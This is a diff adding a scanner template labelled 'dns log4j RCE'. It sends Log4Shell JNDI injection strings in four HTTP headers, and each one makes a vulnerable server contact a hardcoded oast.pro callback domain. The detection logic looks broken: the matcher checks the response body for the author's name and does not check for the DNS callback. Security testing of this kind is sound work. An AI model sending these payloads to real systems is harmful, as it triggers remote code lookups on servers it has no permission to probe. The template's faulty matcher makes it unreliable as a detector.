@@ -1,0 +1,23 @@
+id: dns-log4j
+
+info:
+  name: dns log4j RCE
+  author: Omkar7505
+  severity: critical
+  tags: rce
+
+requests:
+- raw:
+  - |+
+    GET / HTTP/1.1
+    Host: {{Hostname}}
+    User-agent: ${jndi:dns://{{Hostname}}.b3ee9884d98b98e17c70gta9oheyyyyyb.oast.pro/a}
+    X-Forwarded-For: ${jndi:dns://{{Hostname}}.b3ee9884d98b98e17c70gta9oheyyyyyb.oast.pro/a}
+    Referer: ${jndi:dns://{{Hostname}}.b3ee9884d98b98e17c70gta9oheyyyyyb.oast.pro/a}
+    X-Api-Version: ${jndi:dns://{{Hostname}}.b3ee9884d98b98e17c70gta9oheyyyyyb.oast.pro/a}
+
+  matchers:
+  - type: word
+    part: body
+    words:
+      - "Omkar7505"
